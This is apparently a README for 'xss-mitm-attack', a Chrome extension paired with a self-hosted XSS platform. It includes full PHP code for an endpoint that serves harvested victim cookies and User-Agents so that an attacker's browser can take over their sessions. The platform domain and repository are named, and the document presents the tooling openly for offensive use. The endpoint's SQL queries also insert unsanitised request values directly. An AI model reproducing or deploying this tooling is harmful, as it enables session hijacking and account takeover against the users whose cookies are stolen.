xss-mitm-attack
===============

a chrome extension for xss attack

##前言
修改后的拓展符合manifest 2.0的规范，而且能够同时劫持cookie&用户浏览器的User-Agent（有些网站的加密cookie是跟当前用户浏览器ua相关的所以我们希望达到的时完全模拟用户的会话请求）

##接口json返回示例

	[
	    {
	        "url": "http://xx.xxx.com/",
	        "cookie": "asd=adasdasd;",
	        "ua": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
	    },
	    {
	        "url": "http://asd.asdasdasd.com/",
	        "cookie": "backauthv20=asdasd; login_log_date_449=1408079402",
	        "ua": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36"
	    }
	]


自改xss小平台上线

　　原先一直用xss.hk结果不知怎么被关的，正好手上有代码于是自己搭了一个，网上的类似的xss平台大多一样，原先的xss的chrome插件，不适合 "manifest_version": 2, 
而且很多其他的xss平台直接把代码拿过来，chrome插件的里面的许多代码内容跟xss.me这个与域名绑定的，而且有些加密cookie里面有浏览器的ua信息绑定，所以只用插件替换cookie有时候无法达到效果，否则得借助第三方修改header的插件，我们希望的是完全模拟劫持到的浏览器会话。 
于是有了这一次的修改，php那把在/do/auth的那个接口返回增加了劫持ua的信息，点击口修改当前浏览器cookie跟ua来劫持会话。 
数据放在别人那总归不放心，当然你也可以只用插件，填你自己的接口的信息，你只用插件来劫持会话，我也不会知道你的数据，不过你得稍微修改下php后台的的接口。

平台地址：

x.liet.me

因被公司和谐，域名转到原先的账号依然存在  code4liet.duapp.com

 

chrome xss mitm attack插件代码地址

https://github.com/lietdai/xss-mitm-attack

 

修改后的do.php

<?php
/**
 * api.php 接口
 * ----------------------------------------------------------------
 * OldCMS,site:http://www.oldcms.com
 */
if(!defined('IN_OLDCMS')) die('Access Denied');

$auth=Val('auth','GET');
$db=DBConnect();
$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE authCode='{$auth}'");
if(empty($project)) exit('Auth Err.');

switch($act){
    case 'content':
    default:
        $domain=Val('domain','GET');
        $where='';
        if(!empty($domain)) $where.=" AND domain='{$domain}'";
        $res=$db->Dataset("SELECT content,serverContent FROM ".Tb('project_content')." WHERE projectId='{$project[id]}' {$where} ORDER BY id DESC");
        $data=array();
        foreach($res as $k=>$v){
            $row=array();
            $content=json_decode($v['content'],true);
            $serverContent = json_decode($v['serverContent'],true);
            $row['url']=$content['opener']?$content['opener']: $content['toplocation'];
            $row['cookie']=$content['cookie'];
            $serverContent = json_decode($v['serverContent'],true);
            $row['ua'] = $serverContent['HTTP_USER_AGENT']?:"";
            $data[]=$row;
        }
        echo JsonEncode($data);
        break;
}
?>
